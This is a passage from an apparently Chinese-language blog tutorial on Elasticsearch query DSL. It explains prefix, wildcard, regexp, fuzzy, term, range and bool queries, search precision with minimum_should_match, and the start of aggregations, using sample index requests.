class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// query_string未指定字段条件查询(查询所有字段)</span></span><br><span class="line">POST /es_db/_doc/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;query_string&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="string">&quot;广州 OR 长沙&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// query_string指定字段条件查询</span></span><br><span class="line">POST /es_db/_doc/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;query_string&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin OR 长沙&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;address&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>match条件还支持以下参数：</p>
<ul>
<li>query : 指定匹配的值</li>
<li>operator : 匹配条件类型</li>
<li><ul>
<li>and : 条件分词后都要匹配</li>
<li>or : 条件分词后有一个匹配即可(默认)</li>
</ul>
</li>
<li>minmum_should_match : 指定最小匹配的数量</li>
</ul>
</blockquote>
<p>注意<code>query_string</code>的用法，这个地方的如果不加field列，就会所有字段扫描。</p>
<ul>
<li>prefix</li>
</ul>
<p>前缀匹配</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /es_db/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;prefix&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name.keyword&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;li&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用前缀匹配通常针对<strong>keyword类型</strong>字段（<strong>大小写敏感</strong>），也就是不分词的字段。前缀搜索效率比较低，并且前缀搜索不会计算相关度分数。<strong>前缀越短，效率越低。如果使用前缀搜索，建议使用长前缀。</strong>因为前缀搜索需要扫描完整的索引内容，所以前缀越长，相对效率越高。</p>
</blockquote>
<ul>
<li>wildcard</li>
</ul>
<p>ES中也有通配符。但是和java还有数据库不太一样。通配符可以在倒排索引中使用，也可以在keyword类型字段中使用。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ? 匹配一个任意字符</span></span><br><span class="line"><span class="comment">// * 匹配0~n个任意字符</span></span><br><span class="line"></span><br><span class="line">GET /es_db/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;wildcard&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*d*n*&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>regexp</li>
</ul>
<p>通过正则表达式来匹配数据</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /es_db/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;regexp&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[A-z].+&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>常用符号：</p>
<p>[] 表示范围，如： [0-9]是0~9的范围数字</p>
<p>. 表示一个字符</p>
<p>+ 表示前面的表达式可以出现多次</p>
</blockquote>
<ul>
<li>fuzzy</li>
</ul>
<p>模糊查询</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /es_db/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;fuzzy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jeva&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fuzziness&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>搜索的时候，可能搜索条件文本输入错误，如：hello world -&gt; hello word。这种拼写错误还是很常见的。fuzzy技术就是用于解决错误拼写的（在英文中很有效，在中文中几乎无效）。其中fuzziness代表value的值word可以修改多少个字母来进行拼写错误的纠正（修改字母的数量包含字母变更、增加或减少）。</p>
</blockquote>
<h5 id="精确匹配"><a href="#精确匹配" class="headerlink" title="精确匹配"></a>精确匹配</h5><ul>
<li>term</li>
</ul>
<p>单个条件相等</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// term查询不会对字段进行分词查询，会采用精确匹配 </span></span><br><span class="line">POST /es_db/_doc/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;term&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>terms</li>
</ul>
<p>单个字段属于某个值数组内的值</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST /es_db/_doc/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;terms&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="string">&quot;liduoan&quot;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>range</li>
</ul>
<p>字段属于某个范围内的值</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 分页、范围、投影、排序</span></span><br><span class="line">POST /es_db/_doc/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;range&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;gte&quot;</span><span class="punctuation">:</span> <span class="number">25</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;lte&quot;</span><span class="punctuation">:</span> <span class="number">28</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;from&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;_source&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;age&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;address&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;sort&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="string">&quot;desc&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>range：范围关键字</p>
<p>gte：大于等于</p>
<p>lte：小于等于</p>
<p>gt：大于</p>
<p>lt：小于</p>
<p>now：当前时间</p>
</blockquote>
<p><strong>1. match</strong></p>
<p>match：模糊匹配，需要指定字段名，但是输入会进行分词，比如”hello world”会进行拆分为hello和world，然后匹配，如果字段中包含hello或者world，或者都包含的结果都会被查询出来，也就是说match是一个部分匹配的模糊查询。查询条件相对来说比较宽松。</p>
<p><strong>2、term</strong></p>
<p>term: 这种查询和match在有些时候是等价的，比如我们查询单个的词hello，那么会和match查询结果一样，但是如果查询”hello world”，结果就相差很大，因为这个输入不会进行分词，就是说查询的时候，是查询字段分词结果中是否有”hello world”的字样，而不是查询字段中包含”hello world”的字样。当保存数据”hello world”时，ES会对字段内容进行分词，”hello world”会被分成hello和world，不存在”hello world”，因此这里的查询结果会为空。这也是term查询和match的区别。</p>
<p><strong>3. match_phase</strong></p>
<p>match_phase：会对输入做分词，但是需要结果中也包含所有的分词，而且顺序要求一样。以”hello world”为例，要求结果中必须包含hello和world，而且还要求他们是连着的，顺序也是固定的，hello that world不满足，world hello也不满足条件。</p>
<p><strong>4、query_string</strong></p>
<p>query_string：和match类似，但是match需要指定字段名，query_string是在所有字段中搜索，范围更广泛。</p>
<h4 id="查询与过滤"><a href="#查询与过滤" class="headerlink" title="查询与过滤"></a>查询与过滤</h4><p>DSL查询语言中存在两种，查询DSL（query DSL）和过滤DSL（filter DSL）。它们两个的区别如下图：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/20/2ctSVjB9Gz1DQLR.png"
                      alt="es8.jpg"
                ></p>
<h5 id="query-DSL"><a href="#query-DSL" class="headerlink" title="query DSL"></a>query DSL</h5><p>在查询上下文中，查询不仅会检查文档是否匹配，还会计算匹配的<strong>相关度</strong>。</p>
<p>如何验证匹配很好理解，如何计算相关度呢？ES中索引的数据都会存储一个<code>_score</code>分值，分值越高就代表越匹配。</p>
<p>另外关于某个搜索的分值计算还是很复杂的，因此也需要一定的时间。</p>
<h5 id="filter-DSL"><a href="#filter-DSL" class="headerlink" title="filter DSL"></a>filter DSL</h5><p>在过滤器上下文中，只会判断文档是否匹配。答案很简单，是或者不是。它不会去计算任何分值，也不会关心返回的排序问题，因此效率会高一点。过滤上下文是在使用<code>filter</code>参数时候的执行环境。另外，经常使用过滤器，ES会自动的缓存过滤器的内容，这对于查询来说，会提高很多性能。</p>
<h4 id="组合条件查询"><a href="#组合条件查询" class="headerlink" title="组合条件查询"></a>组合条件查询</h4><p>组合条件查询是<strong>将叶子条件查询语句进行组合</strong>而形成的一个完整的查询条件：</p>
<ul>
<li>bool : 各条件之间有and、or或not的关系</li>
<li><ul>
<li>must : 各个条件都必须满足，即各条件是and的关系</li>
<li>should : 各个条件有一个满足即可，即各条件是or的关系</li>
<li>must_not : 不满足所有条件，即各条件是not的关系</li>
<li>filter : 不计算相关度评分，它不计算_score即相关度评分，效率更高</li>
</ul>
</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /test_a/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;bool&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;must&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;match&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;f&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java spark&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;should&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;match_phrase&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;f&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java spark&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;slop&quot;</span><span class="punctuation">:</span> <span class="number">50</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>must&#x2F;filter&#x2F;shoud&#x2F;must_not的子条件是通过term&#x2F;terms&#x2F;range&#x2F;ids&#x2F;exists&#x2F;match叶子条件作为参数的。</strong><br>以上参数，当只有一个搜索条件时，must等对应的是一个对象；<br>当是多个条件时，对应的是一个数组。</p>
<h3 id="搜索精度控制"><a href="#搜索精度控制" class="headerlink" title="搜索精度控制"></a>搜索精度控制</h3><p>先看下面一条查询：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /es_db/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;match&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java developer&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;operator&quot;</span><span class="punctuation">:</span> <span class="string">&quot;and&quot;</span> <span class="comment">// 表示两个词都要包含才能匹配</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>上述语法中，如果将operator的值改为or。则与第一个案例搜索语法效果一致。默认的ES执行搜索的时候，operator就是or。</p>
<p>如果在搜索的结果document中，需要remark字段中包含多个搜索词条中的一定比例，可以使用下述语法实现搜索。其中<code>minimum_should_match</code>可以使用<strong>百分比</strong>或<strong>固定数字</strong>。百分比代表query搜索条件中词条百分比，如果无法整除，向下匹配（如query条件有3个单词，如果使用百分比提供精准度计算，那么是无法除尽的，如果需要至少匹配两个单词，则需要用67%来进行描述。如果使用66%描述，ES则认为匹配一个单词即可）。固定数字代表query搜索条件中的词条，至少需要匹配多少个：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /es_db/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;match&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java architect assistant&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;minimum_should_match&quot;</span><span class="punctuation">:</span> <span class="string">&quot;68%&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>如果使用should+bool搜索的话，也可以控制搜索条件的匹配度。具体如下</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /es_db/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;query&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;bool&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;should&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;match&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;match&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;developer&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;match&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;assistant&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;minimum_should_match&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>代表搜索的document中的remark字段中，必须匹配java、developer、assistant三个词条中的至少2个。</p>
<h1 id="DSL聚合"><a href="#DSL聚合" class="headerlink" title="DSL聚合"></a>DSL聚合</h1><p>聚合的格式如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GET /index_name/type_name/_search</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;定义分组名称（最外层）&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;分组策略如：terms、avg、sum&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;根据哪一个字段分组&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;其他参数&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;aggs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;分组名称1&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;分组名称2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>aggs可以<strong>嵌套</strong>定义，可以<strong>水平</strong>定义。嵌套定义称为下钻分析，而水平定义就是平铺多个分组方式。</p>
<h2 id="Bucket与Metric"><a href="#Bucket与Metric" class="headerlink" title="Bucket与Metric"></a>Bucket与Metric</h2><ul>
<li>bucket就是一个聚合搜索时的数据分组。如：销售部门有员工张三和李四，开发部门有员工王五和赵六。那么根据部门分组聚合得到结果就是两个bucket。销售部门bucket中有张三和李四，开发部门 bucket中有王五和赵六。</li>
<li>metric就是对一个bucket数据执行的统计分析。如上述案例中，开发部门有2个员工，销售部门有2个员工，这就是metric。metric有多种统计，如：求和，最大值，最小值，平均值等。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 用一个大家容易理解的SQL语法来解释</span><br><span class="line">select count(*) from table group by column</span><br><span class="line"># 那么group by column分组后的每组数据就是bucket，再对每个分组执行的count(*)就是metric。</span><br></pre></td></tr></table></figure>

<p>我们准备一些汽车的数据：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">PUT /cars</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;mappings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;price&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;long&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;keyword&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;brand&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;keyword&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;model&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;keyword&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;sold_date&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;date&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;analyzer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ik_max_word&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">POST /cars/_bulk</span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;price&quot;</span> <span class="punctuation">:</span> <span class="number">258000</span><span class="punctuation">,</span> <span class="attr">&quot;color&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;金色&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;brand&quot;</span><span class="punctuation">:</span><span class="string">&quot;大众&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;model&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;大众迈腾&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sold_date&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2021-10-28&quot;</span><span class="punctuation">,</span><span class="attr">&quot;remark&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;大众中档车&quot;</span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;price&quot;</span> <span class="punctuation">:</span> <span class="number">123000</span><span class="punctuation">,</span> <span class="attr">&quot;color&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;金色&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;brand&quot;</span><span class="punctuation">:</span><span class="string">&quot;大众&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;model&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;大众速腾&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sold_date&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2021-11-05&quot;</span><span class="punctuation">,</span><span class="attr">&quot;remark&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;大众神车&quot;</span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;price&quot;</span> <span class="punctuation">:</span> <span class="number">239800</span><span class="punctuation">,</span> <span class="attr">&quot;color&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;白色&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;brand&quot;</span><span class="punctuation">:</span><span class="string">&quot;标志&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;model&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;标志508&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sold_date&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2021-05-18&quot;</span><span class="punctuation">,</span><span class="attr">&quot;remark&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;标志品牌全球上市车型&quot;</span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;price&quot;</span> <span class="punctuation">:</span> <span class="number">148800</span><span class="punctuation">,</span> <span class="attr">&quot;color&quot;</span> <span 